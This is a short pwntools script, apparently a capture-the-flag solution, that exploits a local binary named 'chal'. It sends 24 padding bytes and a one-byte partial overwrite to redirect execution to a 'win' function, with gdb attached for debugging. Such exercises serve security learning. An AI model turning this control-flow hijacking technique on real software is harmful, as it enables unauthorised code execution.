from pwn import *

exe = ELF("./chal", checksec=False)
context.log_level = "WARNING"
context.binary = exe
context.terminal = "konsole -e".split()

def gdbdebug(exe: process):
    script = """
    break *win
    finish
    """
    gdb.attach(exe, gdbscript=script)

p = process()
gdbdebug(p)
payload = b""
payload += b"aaaabaaacaaadaaaeaaafaaa"
payload += b"\x19"
p.send(payload)
p.interactive()